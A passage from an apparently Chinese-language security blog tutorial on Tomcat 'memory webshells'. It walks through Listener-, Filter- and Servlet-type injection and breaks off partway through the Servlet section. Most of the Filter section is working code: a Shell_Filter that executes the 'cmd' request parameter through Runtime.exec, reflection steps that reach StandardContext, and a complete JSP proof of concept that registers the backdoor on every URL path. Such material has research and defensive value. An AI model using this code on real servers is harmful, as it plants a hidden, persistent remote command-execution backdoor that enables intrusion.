然后通过这个类里的<code>addApplicationEventListener</code>来添加我们的恶意<code>Listener</code></p><p>然后添加成功后，这个<code>servlet</code>的<code>Listener</code>就会处理我们的http请求  然后如果传进来<code>cmd</code>的恶意参数的话就会执行</p><p>然后访问<code>Listener.jsp</code>将恶意<code>Listener</code>写入服务器</p><p><img src="../images/image-20230801104434368.png" alt="image-20230801104434368"></p><p><strong>然后直接执行就行了</strong></p><p><img src="../images/image-20230801104455200.png" alt="image-20230801104455200"></p><h3 id="Filter型"><a href="#Filter型" class="headerlink" title="Filter型"></a>Filter型</h3><p>这里解释一下这个<code>Filter</code>是个什么东西</p><p><strong>它在java中是起到一个过滤器的作用，就是无论用户访问哪个具体的路径，都会被该过滤器所拦截和处理，然后它将对所有进入应用程序的请求起作用。它可以执行一些预处理或后处理操作，并决定是否继续传递请求给下一个组件（如Servlet）</strong></p><p>(这就是为什么可以当内存马的原因了 因为自身也可以对http请求进行预处理)</p><p>仿照Listener型内存马的实现思路，我们同样能实现Filter型内存马。我们知道，在Servlet容器中，Filter的调用是通过<code>FilterChain</code>实现的</p><p><strong>和<code>Listener</code>一样   最后都是会调用某一个特定的方法</strong></p><p>这里是调用这个<code>doFilter()</code> 方法</p><p><img src="../images/image.png" alt="img"></p><p>先来实现一个恶意的<code>Filter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Filter;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@WebFilter(&quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Filter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                n.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的话我们在这个<code>doFilter</code>处打上断点   </p><p><img src="../images/image-20230801113428574.png" alt="image-20230801113428574"></p><p>得到调用栈</p><p>跟进<code>ApplicationFilterChain#internalDoFilter</code></p><p><img src="../images/image-20230801113542381.png" alt="image-20230801113542381"></p><p>调用了<code>filter.doFilter()</code>，而<code>filter</code>是通过<code>filterConfig.getFilter()</code>得到的，<code>filterConfig</code>定义如下</p><p><img src="../images/image-20230801115805488.png" alt="image-20230801115805488"></p><p>我们知道，一个filterConfig对应一个Filter，用于存储Filter的上下文信息。这里的<em><code>filters</code></em>属性是一个ApplicationFilterConfig数组。我们来寻找一下<em><code>ApplicationFilterChain.filters</code></em>属性在哪里被赋值。</p><p><strong>这里的话看调用栈就能找到了</strong></p><p>在<code>StandardWrapperValve#invoke</code>这个方法里面</p><p><img src="../images/image-20230801142627056.png" alt="image-20230801142627056"></p><p>跟进这个<em><code>ApplicationFilterFactory#createFilterChain</code></em>函数</p><p><img src="../images/image-20230801142917799.png" alt="image-20230801142917799"></p><p>通过这个函数  我们可以清晰的来分析这个<code>filterChain</code>的创建过程</p><ol><li>首先通过<code>filterChain = new ApplicationFilterChain()</code>创建一个空的filterChain对象</li><li>然后通过<code>wrapper.getParent()</code>函数来获取<code>StandardContext</code>对象</li><li>接着获取<code>StandardContext</code>中的<code>FilterMaps</code>对象，<code>FilterMaps</code>对象中存储的是各Filter的名称路径等信息</li><li>最后根据Filter的名称，在<code>StandardContext</code>中获取<code>FilterConfig</code></li><li>通过<code>filterChain.addFilter(filterConfig)</code>将一个<code>filterConfig</code>添加到<code>filterChain</code>中</li></ol><p>跟进这个<code>ApplicationFilterChain#addFilter</code>方法</p><p><img src="../images/image-20230801143332841.png" alt="image-20230801143332841"></p><p>这里就可以看到<code>filters</code>被赋值的过程</p><p><img src="../images/image-20230801143540902.png" alt="image-20230801143540902"></p><p>这样的话我们就可以控制调用谁的<code>doFilter()</code>方法了</p><p>所以关键就是将恶意Filter的信息添加进<code>FilterConfig</code>数组中，这样Tomcat在启动时就会自动初始化我们的恶意Filter。</p><h4 id="FilterConfig、FilterDef和FilterMaps"><a href="#FilterConfig、FilterDef和FilterMaps" class="headerlink" title="FilterConfig、FilterDef和FilterMaps"></a>FilterConfig、FilterDef和FilterMaps</h4><p>虽然<code>filterConfig</code>的赋值方法找到了  但是通过赋值的过程中  还是会用到</p><p><code>FilterDef</code>和<code>FilterMaps</code>的</p><p>跟进到createFilterChain函数中，我们能看到此时的上下文对象<code>StandardContext</code>实际上是包含了这三者的</p><p><img src="../images/image-20230801144512577.png" alt="image-20230801144512577"></p><h5 id="filterConfigs"><a href="#filterConfigs" class="headerlink" title="filterConfigs"></a>filterConfigs</h5><p>其中filterConfigs包含了当前的上下文信息<code>StandardContext</code>、以及<code>filterDef</code>等信息</p><p><img src="../images/image-20230801145049895.png" alt="image-20230801145049895"></p><p>其中<code>filterDef</code>存放了filter的定义，包括filterClass、filterName等信息。对应的其实就是web.xml中的<code>&lt;filter&gt;</code>标签。</p><p><img src="../images/image-20230801145337682.png" alt="image-20230801145337682">    </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span><span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span><span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，filterDef必要的属性为<code>filter</code>、<code>filterClass</code>以及<code>filterName</code>。</p><h5 id="filterDefs"><a href="#filterDefs" class="headerlink" title="filterDefs"></a>filterDefs</h5><p><img src="../images/image-20230801145617679.png" alt="image-20230801145617679"></p><p><code>filterDefs</code>是一个<code>HashMap</code>，以键值对的形式存储<code>filterDef</code></p><h5 id="filterMaps"><a href="#filterMaps" class="headerlink" title="filterMaps"></a>filterMaps</h5><p><code>filterMaps</code>中以array的形式存放各filter的路径映射信息，其对应的是web.xml中的<code>&lt;filter-mapping&gt;</code>标签</p><p><img src="../images/image-20230801145757771.png" alt="image-20230801145757771"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span><span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span><span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>filterMaps必要的属性为<code>dispatcherMapping</code>、<code>filterName</code>、<code>urlPatterns</code></p><p>于是下面的工作就是构造含有恶意filter的FilterMaps和FilterConfig对象，并将FilterConfig添加到filter链中了。</p><h4 id="动态注册Filter"><a href="#动态注册Filter" class="headerlink" title="动态注册Filter"></a>动态注册Filter</h4><p>经过上面的分析，我们可以总结出动态添加恶意Filter的思路</p><ol><li>获取StandardContext对象</li></ol><p><strong>(因为要构造那三种<code>filter</code>  都需要<code>StandardContext</code>    <code>StandardContext</code>包含了那三种<code>filter</code>)</strong></p><ol><li>创建恶意Filter</li></ol><p><strong>因为最后是要控制filter的值为我们构造的恶意Filter类</strong></p><p><img src="../images/image-20230801151809859.png" alt="image-20230801151809859"></p><ol><li>使用FilterDef对Filter进行封装，并添加必要的属性</li></ol><p><img src="../images/image-20230801152009396.png" alt="image-20230801152009396"></p><p>因为<code>value</code>是<code>FilterDef</code>的    然后还得添加下面的属性</p><ol><li>创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中</li></ol><p><img src="../images/image-20230801152156916.png" alt="image-20230801152156916"></p><p><strong>这里就是上面新建<code>FilterMap</code>的原因  还有传name和path的原因</strong></p><ol><li>使用<code>ApplicationFilterConfig</code>封装<code>filterDef</code>，然后将其添加到<code>filterConfigs</code>中</li></ol><p><img src="../images/image-20230801152404617.png" alt="image-20230801152404617"></p><p><strong>其实上面的这五个步骤得来的原因都可以追述到前面写的记录   都是先进行逐步分析  然后才得出最终步骤的</strong></p><h5 id="第一步————-获取StandardContext对象"><a href="#第一步————-获取StandardContext对象" class="headerlink" title="第一步————-获取StandardContext对象"></a>第一步————-获取StandardContext对象</h5><p>StandardContext对象主要用来管理Web应用的一些全局资源，如Session、Cookie、Servlet等。因此我们有很多方法来获取StandardContext对象。</p><p>Tomcat在启动时会为每个Context都创建个ServletContext对象，来表示一个Context，从而可以将ServletContext转化为StandardContext。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取ApplicationContextFacade类</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"> </span><br><span class="line"><span class="comment">//反射获取ApplicationContextFacade类属性context为ApplicationContext类</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//反射获取ApplicationContext类属性context为StandardContext类</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230801152744222.png" alt="image-20230801152744222"></p><p>上述的代码就是根据这一块来写的   从启动时<code>tomcat</code>自动创建的<code>ServletContext</code>开始   然后一步一步引导到<code>StandardContext</code></p><h5 id="第二步—————创建恶意Filter"><a href="#第二步—————创建恶意Filter" class="headerlink" title="第二步—————创建恶意Filter"></a>第二步—————创建恶意Filter</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Filter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        String cmd=request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">            n.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="第三步———————使用FilterDef封装filter"><a href="#第三步———————使用FilterDef封装filter" class="headerlink" title="第三步———————使用FilterDef封装filter"></a>第三步———————使用FilterDef封装filter</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//filter名称</span></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;CommonFilter&quot;</span>;</span><br><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">filterDef.setFilter(filter);</span><br><span class="line">filterDef.setFilterName(name);</span><br><span class="line">filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">standardContext.addFilterDef(filterDef);</span><br></pre></td></tr></table></figure><h5 id="第四步————————创建filterMap"><a href="#第四步————————创建filterMap" class="headerlink" title="第四步————————创建filterMap"></a>第四步————————创建filterMap</h5><p>filterMap用于filter和路径的绑定</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">filterMap.setFilterName(name);</span><br><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">standardContext.addFilterMapBefore(filterMap);</span><br></pre></td></tr></table></figure><h5 id="第五步—————-封装filterConfig及filterDef到filterConfigs"><a href="#第五步—————-封装filterConfig及filterDef到filterConfigs" class="headerlink" title="第五步—————-封装filterConfig及filterDef到filterConfigs"></a>第五步—————-封装filterConfig及filterDef到filterConfigs</h5><p>封装filterConfig及filterDef到filterConfigs</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line">    </span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line">filterConfigs.put(name, filterConfig);</span><br></pre></td></tr></table></figure><h5 id="完整POC-1"><a href="#完整POC-1" class="headerlink" title="完整POC"></a>完整POC</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%! <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Filter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Shell_Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Filter</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;CommonFilter&quot;</span>;</span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(name);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(name);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"> </span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line">    filterConfigs.put(name, filterConfig);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230801212525992.png" alt="image-20230801212525992"></p><p>先运行<code>Listener.jsp</code>  然后将内存马写入  然后就可以直接访问了</p><p><img src="../images/image-20230801212612721.png" alt="image-20230801212612721"></p><h3 id="Servlet型"><a href="#Servlet型" class="headerlink" title="Servlet型"></a>Servlet型</h3><h4 id="Servlet创建流程"><a href="#Servlet创建流程" class="headerlink" title="Servlet创建流程"></a>Servlet创建流程</h4><p>我们知道Servlet的生命周期分为如下五部分</p><ol><li>加载：当Tomcat第一次访问Servlet的时候，Tomcat会负责创建Servlet的实例</li><li>初始化：当Servlet被实例化后，Tomcat会调用<code>init()</code>方法初始化这个对象</li><li>处理服务：当浏览器访问Servlet的时候，Servlet 会调用<code>service()</code>方法处理请求</li><li>销毁：当Tomcat关闭时或者检测到Servlet要从Tomcat删除的时候会自动调用<code>destroy()</code>方法，让该实例释放掉所占的资源。一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁</li><li>卸载：当Servlet调用完<code>destroy()</code>方法后，等待垃圾回收。如果有需要再次使用这个Servlet，会重新调用<code>init()</code>方法进行初始化操作</li></ol><p>在<code>org.apache.catalina.core.StandardContext</code>类的<code>startInternal()</code>方法中，我们能看到<code>Listener-&gt;Filter-&gt;Servlet</code>的加载顺序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!listenerStart()) &#123;</span><br><span class="line">                    log.error(sm.getString(<span class="string">&quot;standardContext.listenerFail&quot;</span>));</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// Start manager</span></span><br><span class="line">                <span class="type">Manager</span> <span class="variable">manager</span> <span class="operator">=</span> getManager();</span><br><span class="line">                <span class="keyword">if</span> (manager <span class="keyword">instanceof</span> Lifecycle) &#123;</span><br><span class="line">                    ((Lifecycle) manager).start();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">                log.error(sm.getString(<span class="string">&quot;standardContext.managerFail&quot;</span>), e);</span><br><span class="line">                ok = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Configure and call application filters</span></span><br><span class="line">            <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!filterStart()) &#123;</span><br><span class="line">                    log.error(sm.getString(<span class="string">&quot;standardContext.filterFail&quot;</span>));</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Load and initialize all &quot;load on startup&quot; servlets</span></span><br><span class="line">            <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!loadOnStartup(findChildren()))&#123;</span><br><span class="line">                    log.error(sm.getString(<span class="string">&quot;standardContext.servletFail&quot;</span>));</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Start ContainerBackgroundProcessor thread</span></span><br><span class="line">            <span class="built_in">super</span>.threadStart();</span><br><span class="line">        &#125;<span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!listenerStart()) 